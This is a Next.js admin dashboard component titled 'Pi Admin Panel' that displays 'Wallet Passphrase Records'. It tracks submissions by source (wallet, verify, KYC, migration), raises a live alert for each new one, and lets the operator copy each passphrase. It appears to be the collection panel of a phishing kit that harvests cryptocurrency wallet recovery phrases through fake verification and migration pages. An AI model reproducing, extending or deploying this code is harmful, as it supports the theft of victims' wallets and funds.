"use client";

import React, { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import { Copy, Check } from "lucide-react";

interface WalletRecord {
  id: number;
  passphrase: string;
  source: string;
  createdAt: string;
}

interface Stats {
  total: number;
  today: number;
  wallet: number;
  verify: number;
  kyc: number;
  migration: number;
}

export default function AdminDashboard() {
  const router = useRouter();
  const [records, setRecords] = useState<WalletRecord[]>([]);
  const [stats, setStats] = useState<Stats>({
    total: 0,
    today: 0,
    wallet: 0,
    verify: 0,
    kyc: 0,
    migration: 0,
  });

  const [search, setSearch] = useState("");
  const [page, setPage] = useState(1);
  const [limit, setLimit] = useState(10);
  const [sortBy, setSortBy] = useState("id");
  const [sortOrder, setSortOrder] = useState<"asc" | "desc">("desc");
  const [totalEntries, setTotalEntries] = useState(0);
  
  const [newRecordIds, setNewRecordIds] = useState<Set<number>>(new Set());
  const [notification, setNotification] = useState<string | null>(null);
  const [showPasswordModal, setShowPasswordModal] = useState(false);
  const [currentPassword, setCurrentPassword] = useState("");
  const [newPassword, setNewPassword] = useState("");
  const [passwordFeedback, setPasswordFeedback] = useState("");
  const [isLoadingPassword, setIsLoadingPassword] = useState(false);
  const [mounted, setMounted] = useState(false);
  
  // Custom states for simplified UI
  const [expandedRowId, setExpandedRowId] = useState<number | null>(null);
  const [copiedId, setCopiedId] = useState<number | null>(null);

  useEffect(() => {
    setMounted(true);
  }, []);

  const eventSourceRef = useRef<EventSource | null>(null);

  // Fetch initial records and stats
  const fetchData = async () => {
    try {
      const query = new URLSearchParams({
        search,
        page: page.toString(),
        limit: limit.toString(),
        sortBy,
        sortOrder,
      });

      const response = await fetch(`/api/admin/records?${query}`);
      if (response.status === 401) {
        router.push("/admin/login");
        return;
      }

      if (!response.ok) throw new Error("Failed to fetch data");

      const data = await response.json();
      setRecords(data.records);
      setStats(data.stats);
      setTotalEntries(data.pagination.totalEntries);
    } catch (error) {
      console.error("Error fetching admin data:", error);
    }
  };

  useEffect(() => {
    fetchData();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [search, page, limit, sortBy, sortOrder]);

  // Connect to SSE for real-time updates
  useEffect(() => {
    const sse = new EventSource("/api/admin/sse");
    eventSourceRef.current = sse;

    sse.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        if (data.event === "connected" || data.event === "ping") return;

        const newRecord = data as WalletRecord;

        // Trigger flat alert notification
        setNotification(`New submission received from: ${newRecord.source}`);
        setTimeout(() => setNotification(null), 5000);

        // Flash rows
        setNewRecordIds((prev) => {
          const next = new Set(prev);
          next.add(newRecord.id);
          return next;
        });

        // Remove flash after 5 seconds
        setTimeout(() => {
          setNewRecordIds((prev) => {
            const next = new Set(prev);
            next.delete(newRecord.id);
            return next;
          });
        }, 5000);

        // Refresh table & stats
        fetchData();
      } catch (err) {
        console.error("Error parsing SSE data:", err);
      }
    };

    sse.onerror = (err) => {
      console.error("SSE connection error:", err);
    };

    return () => {
      sse.close();
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const handleLogout = async () => {
    try {
      await fetch("/api/admin/logout", { method: "POST" });
      router.push("/admin/login");
      router.refresh();
    } catch (err) {
      console.error(err);
    }
  };

  const handleSort = (field: string) => {
    if (sortBy === field) {
      setSortOrder(sortOrder === "asc" ? "desc" : "asc");
    } else {
      setSortBy(field);
      setSortOrder("desc");
    }
    setPage(1);
  };

  const changePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!currentPassword.trim()) {
      setPasswordFeedback("Current password is required.");
      return;
    }
    if (!newPassword.trim()) {
      setPasswordFeedback("New password cannot be blank.");
      return;
    }
    if (newPassword.length < 6) {
      setPasswordFeedback("New password must be at least 6 characters.");
      return;
    }
    setPasswordFeedback("");
    setIsLoadingPassword(true);
    try {
      const res = await fetch("/api/admin/change-password", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ currentPassword, newPassword }),
      });
      const data = await res.json();
      if (!res.ok) {
        setPasswordFeedback(data.error || "Failed to update password.");
      } else {
        setPasswordFeedback("Password updated successfully!");
        setCurrentPassword("");
        setNewPassword("");
        setTimeout(() => {
          setShowPasswordModal(false);
          setPasswordFeedback("");
        }, 1500);
      }
    } catch {
      setPasswordFeedback("Network error. Please try again.");
    } finally {
      setIsLoadingPassword(false);
    }
  };

  const totalPages = Math.ceil(totalEntries / limit);
  const startEntry = totalEntries === 0 ? 0 : (page - 1) * limit + 1;
  const endEntry = Math.min(page * limit, totalEntries);

  if (!mounted) return null;

  return (
    <div className="min-h-screen bg-[#ecf0f5] font-sans flex flex-col text-[#333]">
      
      {/* Real-time Alert Notification */}
      {notification && (
        <div className="fixed top-4 right-4 z-50 bg-[#007bff] text-white px-4 py-2.5 rounded shadow-md text-sm font-semibold border border-blue-700">
          ℹ️ {notification}
        </div>
      )}

      {/* Main Container */}
      <div className="flex-1 flex flex-col min-w-0">
        
        {/* Simple Header */}
        <header className="bg-[#3c8dbc] text-white h-14 flex items-center justify-between px-4 shadow-sm flex-shrink-0">
          <div className="flex items-center gap-3">
            <span className="font-semibold text-lg">Pi Admin Panel</span>
          </div>
          <div className="flex items-center gap-2 text-sm text-gray-200">
            <span className="bg-green-500 w-2.5 h-2.5 rounded-full inline-block animate-pulse"></span>
            <span className="hidden sm:inline">Live Sync Enabled</span>
          </div>
        </header>

        {/* Main Content Area */}
        <main className="p-4 sm:p-6 flex-1 overflow-auto flex items-start justify-center">
          
          {/* Centered White Card (Exactly as reference image) */}
          <div className="w-full max-w-4xl bg-white rounded-lg shadow-sm border border-gray-200 p-6 relative">
            
            {/* Action Buttons and Title Wrapper */}
            <div className="flex flex-col items-center mb-6">
              <div className="flex gap-2 mb-3">
                <button
                  onClick={handleLogout}
                  className="bg-[#007bff] hover:bg-[#0056b3] text-white px-3.5 py-1.5 rounded text-sm font-medium transition-colors border-none cursor-pointer"
                >
                  Logout
                </button>
                <button
                  onClick={() => setShowPasswordModal(true)}
                  className="bg-[#007bff] hover:bg-[#0056b3] text-white px-3.5 py-1.5 rounded text-sm font-medium transition-colors border-none cursor-pointer"
                >
                  Change Password
                </button>
              </div>
              <h2 className="text-2xl sm:text-3xl font-extrabold text-zinc-900 text-center tracking-tight">
                Wallet Passphrase Records
              </h2>
            </div>

            {/* Datatable Controls */}
            <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 mb-4 text-sm text-[#333]">
              <div className="flex items-center gap-1.5">
                <span>Show</span>
                <select
                  value={limit}
                  onChange={(e) => {
                    setLimit(parseInt(e.target.value, 10));
                    setPage(1);
                  }}
                  className="bg-white border border-gray-300 rounded px-2 py-1 outline-none text-sm font-medium cursor-pointer"
                >
                  <option value={10}>10</option>
                  <option value={25}>25</option>
                  <option value={50}>50</option>
                  <option value={100}>100</option>
                </select>
                <span>entries</span>
              </div>
              <div className="flex items-center gap-1.5 w-full sm:w-auto">
                <span>Search:</span>
                <input
                  type="text"
                  value={search}
                  onChange={(e) => {
                    setSearch(e.target.value);
                    setPage(1);
                  }}
                  className="border border-gray-300 rounded px-2.5 py-1 outline-none text-sm w-full sm:w-44 focus:border-zinc-400 transition-colors"
                />
              </div>
            </div>

            {/* Datatable */}
            <div className="overflow-x-auto border-t border-gray-200 mt-4">
              <table className="w-full text-left text-sm border-collapse">
                <thead>
                  <tr className="border-b border-gray-300 bg-white text-zinc-900 font-bold">
                    <th 
                      onClick={() => handleSort("id")}
                      className="p-3 cursor-pointer hover:bg-zinc-50 select-none w-20"
                    >
                      <div className="flex items-center gap-1">
                        ID
                        <span className="text-[10px] text-zinc-400">
                          {sortBy === "id" ? (sortOrder === "asc" ? "▲" : "▼") : "▲▼"}
                        </span>
                      </div>
                    </th>
                    <th 
                      onClick={() => handleSort("passphrase")}
                      className="p-3 cursor-pointer hover:bg-zinc-50 select-none"
                    >
                      <div className="flex items-center gap-1">
                        Passphrase
                        <span className="text-[10px] text-zinc-400">
                          {sortBy === "passphrase" ? (sortOrder === "asc" ? "▲" : "▼") : "▲▼"}
                        </span>
                      </div>
                    </th>
                    <th 
                      onClick={() => handleSort("source")}
                      className="p-3 cursor-pointer hover:bg-zinc-50 select-none w-44"
                    >
                      <div className="flex items-center gap-1">
                        Source
                        <span className="text-[10px] text-zinc-400">
                          {sortBy === "source" ? (sortOrder === "asc" ? "▲" : "▼") : "▲▼"}
                        </span>
                      </div>
                    </th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-200 text-zinc-800">
                  {records.length === 0 ? (
                    <tr>
                      <td colSpan={3} className="p-8 text-center text-zinc-400 font-medium">
                        No records found
                      </td>
                    </tr>
                  ) : (
                    records.map((record) => {
                      const isNew = newRecordIds.has(record.id);
                      const isExpanded = expandedRowId === record.id;
                      const dateObj = new Date(record.createdAt);
                      const formattedDate = dateObj.toLocaleDateString();
                      const formattedTime = dateObj.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" });

                      return (
                        <React.Fragment key={record.id}>
                          <tr
                            onClick={() => setExpandedRowId(isExpanded ? null : record.id)}
                            className={`cursor-pointer transition-colors duration-150 ${
                              isNew 
                                ? "bg-emerald-50 text-emerald-950 font-semibold" 
                                : "hover:bg-zinc-50/70"
                            }`}
                            title="Click to view details (Time)"
                          >
                            <td className="p-3 font-mono text-zinc-600">{record.id}</td>
                            <td className="p-3 font-mono tracking-wide text-xs text-zinc-900">
                              <div className="flex items-center gap-2 group justify-between min-w-0">
                                <span className="break-all select-all flex-1">{record.passphrase}</span>
                                <button
                                  onClick={(e) => {
                                    e.stopPropagation();
                                    navigator.clipboard.writeText(record.passphrase);
                                    setCopiedId(record.id);
                                    setTimeout(() => setCopiedId(null), 2000);
                                  }}
                                  className="p-1 hover:bg-zinc-100 rounded text-zinc-400 hover:text-zinc-700 transition-colors border-none bg-transparent cursor-pointer flex-shrink-0 flex items-center justify-center"
                                  title="Copy passphrase"
                                >
                                  {copiedId === record.id ? (
                                    <Check className="h-4 w-4 text-emerald-600" />
                                  ) : (
                                    <Copy className="h-4 w-4" />
                                  )}
                                </button>
                              </div>
                            </td>
                            <td className="p-3">
                              <span className="text-xs text-zinc-700 bg-gray-100 px-2 py-0.5 rounded border border-gray-200">
                                {record.source}
                              </span>
                            </td>
                          </tr>
                          {isExpanded && (
                            <tr className="bg-zinc-50/50">
                              <td colSpan={3} className="p-3 border-t border-dashed border-gray-200">
                                <div className="text-xs text-zinc-500 font-mono">
                                  <span className="font-bold text-zinc-700">Date/Time:</span> {formattedDate} {formattedTime}
                                </div>
                              </td>
                            </tr>
                          )}
                        </React.Fragment>
                      );
                    })
                  )}
                </tbody>
              </table>
            </div>

            {/* Datatable Footer & Pagination */}
            <div className="flex flex-col sm:flex-row items-center justify-between mt-4 pt-4 border-t border-gray-200 gap-4 text-sm text-[#333]">
              <div>
                Showing {startEntry} to {endEntry} of {totalEntries} entries
              </div>
              
              <div className="flex items-center gap-0">
                <button
                  disabled={page === 1}
                  onClick={() => setPage(page - 1)}
                  className="px-3 py-1.5 text-sm font-normal text-[#333] hover:text-[#000] disabled:opacity-40 disabled:hover:text-[#333] border-none bg-transparent cursor-pointer"
                >
                  Previous
                </button>
                
                {totalPages > 0 &&
                  Array.from({ length: totalPages }).map((_, i) => {
                    const pNum = i + 1;
                    const isActive = page === pNum;
                    return (
                      <button
                        key={pNum}
                        onClick={() => setPage(pNum)}
                        className={`px-3 py-1.5 text-sm transition-colors cursor-pointer border ${
                          isActive
                            ? "bg-zinc-100 border-gray-300 text-[#000] font-bold"
                            : "border-transparent text-[#333] hover:text-[#000] hover:bg-zinc-50"
                        }`}
                      >
                        {pNum}
                      </button>
                    );
                  })}

                <button
                  disabled={page === totalPages || totalPages === 0}
                  onClick={() => setPage(page + 1)}
                  className="px-3 py-1.5 text-sm font-normal text-[#333] hover:text-[#000] disabled:opacity-40 disabled:hover:text-[#333] border-none bg-transparent cursor-pointer"
                >
                  Next
                </button>
              </div>
            </div>

          </div>
        </main>
      </div>

      {/* Simplified Change Password Modal */}
      {showPasswordModal && (
        <div className="fixed inset-0 bg-black/50 z-50 flex items-center justify-center p-4">
          <div className="bg-white rounded border border-gray-300 w-full max-w-sm p-6 shadow-md">
            <h3 className="text-zinc-900 font-bold text-lg mb-2">Change Password</h3>
            <p className="text-zinc-500 text-xs mb-4">
              Enter your current password and choose a new one.
            </p>

            <form onSubmit={changePasswordSubmit} className="space-y-4">
              <div>
                <input
                  type="password"
                  value={currentPassword}
                  onChange={(e) => setCurrentPassword(e.target.value)}
                  placeholder="Current password"
                  className="w-full bg-white border border-gray-300 rounded py-2 px-3 text-sm outline-none focus:border-zinc-400 text-zinc-800"
                  disabled={isLoadingPassword}
                />
              </div>
              <div>
                <input
                  type="password"
                  value={newPassword}
                  onChange={(e) => setNewPassword(e.target.value)}
                  placeholder="New password (min 6 characters)"
                  className="w-full bg-white border border-gray-300 rounded py-2 px-3 text-sm outline-none focus:border-zinc-400 text-zinc-800"
                  disabled={isLoadingPassword}
                />
              </div>

              {passwordFeedback && (
                <p className={`text-xs font-semibold ${
                  passwordFeedback.includes("success") ? "text-green-600" : "text-red-600"
                }`}>
                  {passwordFeedback}
                </p>
              )}

              <div className="flex gap-2 justify-end pt-2">
                <button
                  type="button"
                  onClick={() => {
                    setShowPasswordModal(false);
                    setPasswordFeedback("");
                    setCurrentPassword("");
                    setNewPassword("");
                  }}
                  className="px-3.5 py-1.5 bg-zinc-100 hover:bg-zinc-200 border border-gray-300 rounded text-xs font-medium transition-colors cursor-pointer"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  disabled={isLoadingPassword}
                  className="px-3.5 py-1.5 bg-[#007bff] hover:bg-[#0056b3] text-white rounded text-xs font-medium transition-colors cursor-pointer border-none"
                >
                  {isLoadingPassword ? "Updating..." : "Save Password"}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

    </div>
  );
}
